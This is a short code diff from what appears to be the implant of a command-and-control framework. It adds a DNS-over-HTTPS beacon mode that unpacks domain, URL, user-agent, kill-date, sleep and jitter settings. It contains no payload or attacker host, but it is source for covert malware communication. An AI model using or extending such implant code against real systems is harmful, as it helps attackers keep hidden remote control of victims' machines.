@@ -86,9 +86,23 @@ AgentConfig::AgentConfig()
 	this->sleep_delay         = packer->Unpack32();
 	this->jitter_delay        = packer->Unpack32();
 
+#elif defined(BEACON_DOH)
+	this->profile.domain      = packer->UnpackBytesCopy(&length);
+	this->profile.urls        = packer->UnpackBytesCopy(&length);
+	this->profile.user_agent  = packer->UnpackBytesCopy(&length);
+	this->profile.pkt_size    = packer->Unpack32();
+	this->profile.label_size  = packer->Unpack32();
+	this->profile.ttl         = packer->Unpack32();
+	this->profile.encrypt_key = this->encrypt_key;
+	this->listener_type       = packer->Unpack32();
+	this->kill_date           = packer->Unpack32();
+	this->working_time        = packer->Unpack32();
+	this->sleep_delay         = packer->Unpack32();
+	this->jitter_delay        = packer->Unpack32();
+
 #endif
 
-#if defined(BEACON_DNS)
+#if defined(BEACON_DNS) || defined(BEACON_DOH)
 	// DNS beacon uses a smaller per-chunk download size to improve
 	// reliability over the constrained DNS transport channel.
 	this->download_chunk_size = 0x8000; // 32 KB
